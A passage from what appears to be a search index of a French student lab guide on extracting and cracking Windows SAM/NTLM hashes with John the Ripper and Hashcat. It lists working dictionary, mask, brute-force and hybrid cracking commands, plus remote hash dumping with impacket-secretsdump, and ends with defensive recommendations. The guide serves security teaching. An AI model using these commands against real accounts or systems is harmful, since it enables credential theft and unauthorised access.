Motdepasse1 NomEntreprise2024 Kali@2024 EOF john --format=NT --wordlist=mon_dico.txt hashes.txt","title":"Attaque avec un dictionnaire personnalis\u00e9"},{"location":"kali/#suivre-la-progression","text":"# Pendant l'attaque, appuyez sur Entr\u00e9e pour voir la progression # Ou dans un autre terminal : john --status # Affichage typique : # 0g 0:00:00:12 3.2% (ETA: 14:35:22) 0g/s 1842Kp/s 1842Kc/s # g = mots de passe trouv\u00e9s, p/s = mots test\u00e9s par seconde","title":"Suivre la progression"},{"location":"kali/#afficher-les-mots-de-passe-trouves","text":"# Afficher les r\u00e9sultats trouv\u00e9s john --show hashes.txt # Afficher uniquement les hachages NT john --show --format=NT hashes.txt Exemple de r\u00e9sultat : etudiant:password:1001:aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c::: 1 password hash cracked, 0 left Conseil : John sauvegarde automatiquement sa progression dans ~/.john/john.pot . Pour relancer une attaque sur un hachage d\u00e9j\u00e0 crack\u00e9, supprimez cette entr\u00e9e ou utilisez --pot=fichier_different.pot .","title":"Afficher les mots de passe trouv\u00e9s"},{"location":"kali/#05-attaque-par-force-brute-avec-john-the-ripper","text":"","title":"05 \u2014 Attaque par Force Brute avec John the Ripper"},{"location":"kali/#principe-de-lattaque-par-force-brute","text":"La force brute teste toutes les combinaisons possibles de caract\u00e8res selon un jeu de caract\u00e8res et une longueur d\u00e9finis. Elle est exhaustive mais tr\u00e8s lente \u2014 particuli\u00e8rement sur les mots de passe longs. Jeu de caract\u00e8res : a-z (26 lettres) Longueur : 4 caract\u00e8res Combinaisons : 26^4 = 456 976 aaaa \u2192 aab \u2192 aac \u2192 ... \u2192 zzzz \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510 \u2502 Toutes les combinaisons sont \u2502 \u2502 test\u00e9es sans exception \u2502 \u2502 \u2713 Garantit de trouver le MDP \u2502 \u2502 \u2717 Peut prendre tr\u00e8s longtemps\u2502 \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518","title":"Principe de l'attaque par force brute"},{"location":"kali/#modes-de-force-brute-dans-john","text":"John the Ripper utilise les masques pour d\u00e9finir pr\u00e9cis\u00e9ment le jeu de caract\u00e8res \u00e0 utiliser.","title":"Modes de force brute dans John"},{"location":"kali/#jeux-de-caracteres-disponibles-charsets","text":"Symbole Caract\u00e8res inclus ?l Minuscules : a-z ?u Majuscules : A-Z ?d Chiffres : 0-9 ?s Symboles : !@#$%^&* etc. ?a Tous : minuscules + majuscules + chiffres + symboles ?h Hexad\u00e9cimal bas : 0-9a-f","title":"Jeux de caract\u00e8res disponibles (charsets)"},{"location":"kali/#attaque-force-brute-mode-incremental-automatique","text":"Le mode --incremental de John teste toutes les combinaisons de longueur croissante automatiquement : # Force brute compl\u00e8te (tr\u00e8s lent, toutes longueurs et tous caract\u00e8res) john --format=NT --incremental hashes.txt # Force brute sur chiffres uniquement (codes PIN, etc.) john --format=NT --incremental=Digits hashes.txt # Force brute sur minuscules uniquement john --format=NT --incremental=Lower hashes.txt # Force brute sur minuscules + chiffres john --format=NT --incremental=LowerNum hashes.txt # Force brute sur l'alphabet complet john --format=NT --incremental=Alpha hashes.txt","title":"Attaque force brute \u2014 Mode Incremental (automatique)"},{"location":"kali/#attaque-force-brute-mode-masque-recommande","text":"Le mode masque permet de cibler pr\u00e9cis\u00e9ment la structure du mot de passe, ce qui est beaucoup plus efficace : # Mot de passe de 4 caract\u00e8res, minuscules uniquement john --format=NT --mask='?l?l?l?l' hashes.txt # Mot de passe de 6 chiffres (code PIN) john --format=NT --mask='?d?d?d?d?d?d' hashes.txt # Mot de passe de 8 caract\u00e8res : 1 majuscule + 5 minuscules + 2 chiffres john --format=NT --mask='?u?l?l?l?l?l?d?d' hashes.txt # Mot de passe de longueur variable (6 \u00e0 8 caract\u00e8res, tout type) john --format=NT --mask='?a?a?a?a?a?a' --min-length=6 --max-length=8 hashes.txt # Mot de passe commen\u00e7ant par une majuscule, suivi de minuscules et finissant par des chiffres john --format=NT --mask='?u?l?l?l?l?d?d?d' hashes.txt","title":"Attaque force brute \u2014 Mode Masque (recommand\u00e9)"},{"location":"kali/#exemple-pratique-mot-de-passe-type-prenom2024","text":"# Structure : 1 majuscule + minuscules (longueur variable) + 4 chiffres # On suppose 5 minuscules + 4 chiffres john --format=NT --mask='?u?l?l?l?l?l?d?d?d?d' hashes.txt","title":"Exemple pratique \u2014 mot de passe type \"Prenom2024\""},{"location":"kali/#combiner-force-brute-et-dictionnaire-attaque-hybride","text":"Une attaque hybride combine un dictionnaire avec des mutations en suffixe/pr\u00e9fixe : # Dictionnaire + chiffres en suffixe (ex: password123, admin2024) john --format=NT --wordlist=/usr/share/wordlists/rockyou.txt \\ --mask='?w?d?d?d?d' hashes.txt # Dictionnaire + symbole + chiffres john --format=NT --wordlist=/usr/share/wordlists/rockyou.txt \\ --mask='?w?s?d?d' hashes.txt Rappel : ?w repr\u00e9sente le mot courant du dictionnaire dans une attaque hybride.","title":"Combiner force brute et dictionnaire (attaque hybride)"},{"location":"kali/#limiter-le-temps-dexecution","text":"# Arr\u00eater apr\u00e8s 1 heure john --format=NT --incremental hashes.txt --max-run-time=3600 # Arr\u00eater apr\u00e8s avoir trouv\u00e9 N mots de passe john --format=NT --incremental hashes.txt --max-crack=1","title":"Limiter le temps d'ex\u00e9cution"},{"location":"kali/#reprendre-une-attaque-interrompue","text":"John sauvegarde automatiquement sa progression : # Reprendre l\u00e0 o\u00f9 l'attaque s'est arr\u00eat\u00e9e john --restore # Reprendre une session nomm\u00e9e john --restore=nom_session # Lancer une attaque avec un nom de session john --format=NT --incremental hashes.txt --session=ma_session","title":"Reprendre une attaque interrompue"},{"location":"kali/#06-analyse-des-resultats","text":"","title":"06 \u2014 Analyse des R\u00e9sultats"},{"location":"kali/#afficher-tous-les-mots-de-passe-crackes","text":"# Afficher les r\u00e9sultats depuis le fichier pot john --show hashes.txt # Format d\u00e9taill\u00e9 john --show --format=NT hashes.txt","title":"Afficher tous les mots de passe crack\u00e9s"},{"location":"kali/#lire-le-fichier-pot-directement","text":"cat ~/.john/john.pot # Format : $NT$hash:motdepasse_en_clair","title":"Lire le fichier .pot directement"},{"location":"kali/#comparer-les-performances","text":"M\u00e9thode Vitesse typique Efficacit\u00e9 Dictionnaire (rockyou) ~5\u201310 millions/s \u00c9lev\u00e9e sur mots courants Dictionnaire + r\u00e8gles ~1\u20133 millions/s Tr\u00e8s \u00e9lev\u00e9e Force brute (masque court) ~500K\u20132M/s Totale mais lente Force brute (incr\u00e9mental) Variable Garantie mais peut prendre des ann\u00e9es Remarque : Les performances d\u00e9pendent fortement du mat\u00e9riel. Un GPU d\u00e9di\u00e9 avec Hashcat est bien plus rapide que John sur CPU pour la force brute pure.","title":"Comparer les performances"},{"location":"kali/#interpreter-les-resultats","text":"etudiant:password \u2192 Mot de passe tr\u00e8s faible, pr\u00e9sent dans rockyou.txt admin:Admin2024! \u2192 Crack\u00e9 par r\u00e8gles (majuscule + ann\u00e9e + symbole) root:[non trouv\u00e9] \u2192 Mot de passe fort ou absent du dictionnaire","title":"Interpr\u00e9ter les r\u00e9sultats"},{"location":"kali/#aller-plus-loin-hashcat-gpu","text":"Pour des attaques plus rapides avec un GPU : # Installation sudo apt install hashcat -y # Attaque dictionnaire sur hachages NTLM (mode -m 1000) hashcat -m 1000 hashes_ntlm.txt /usr/share/wordlists/rockyou.txt # Force brute NTLM, 8 caract\u00e8res, tout type hashcat -m 1000 -a 3 hashes_ntlm.txt '?a?a?a?a?a?a?a?a' # R\u00e8gles de transformation hashcat -m 1000 hashes_ntlm.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule","title":"Aller plus loin \u2014 Hashcat (GPU)"},{"location":"kali/#07-commandes-de-reference-rapide","text":"","title":"07 \u2014 Commandes de R\u00e9f\u00e9rence Rapide"},{"location":"kali/#john-the-ripper","text":"# V\u00e9rifier la version john --version # Attaque par dictionnaire (format NT) john --format=NT --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt # Attaque par dictionnaire avec r\u00e8gles john --format=NT --wordlist=/usr/share/wordlists/rockyou.txt --rules hashes.txt # Force brute incr\u00e9mentale john --format=NT --incremental hashes.txt # Force brute par masque (ex: 8 caract\u00e8res tout type) john --format=NT --mask='?a?a?a?a?a?a?a?a' hashes.txt # Afficher les r\u00e9sultats trouv\u00e9s john --show hashes.txt # Voir la progression john --status # Reprendre une session john --restore","title":"John the Ripper"},{"location":"kali/#extraction-des-hachages","text":"# Avec impacket (\u00e0 distance) impacket-secretsdump Administrateur:'mdp'@IP_CIBLE # Avec samdump2 (fichiers locaux) samdump2 SYSTEM SAM > hashes.txt # D\u00e9compresser rockyou.txt sudo gunzip /usr/share/wordlists/rockyou.txt.gz","title":"Extraction des hachages"},{"location":"kali/#utilitaires-divers","text":"# Localiser les wordlists disponibles sur Kali ls /usr/share/wordlists/ # Compter les lignes d'un dictionnaire wc -l /usr/share/wordlists/rockyou.txt # Supprimer le fichier .pot (repartir de z\u00e9ro) rm ~/.john/john.pot # Afficher les formats support\u00e9s par John john --list=formats | grep -i NT","title":"Utilitaires divers"},{"location":"kali/#mesures-de-protection-perspective-defensive","text":"Ce laboratoire met en \u00e9vidence l'importance des bonnes pratiques de s\u00e9curit\u00e9 : Bonne pratique Raison Mots de passe longs (16+ caract\u00e8res) Rend la force brute impraticable Mots de passe complexes et uniques R\u00e9siste aux dictionnaires et aux r\u00e8gles D\u00e9sactiver LM Hash (d\u00e9j\u00e0 le cas sur Win Vista+) LM est trivial \u00e0 craquer Activer Windows Hello / MFA Rend le hash inutile sans le second facteur Principe du moindre privil\u00e8ge Limite l'impact d'un compte compromis Surveillance des \u00e9v\u00e9nements 4624/4625 D\u00e9tecte les tentatives de connexion suspectes Guide Kali Linux & Attaque SAM \u00b7 R\u00e9f\u00e9rence pour \u00c9tudiants en Informatique \u00b7 Usage p\u00e9dagogique uniquement \u00b7 2025","title":"Mesures de protection (perspective d\u00e9fensive)"}]}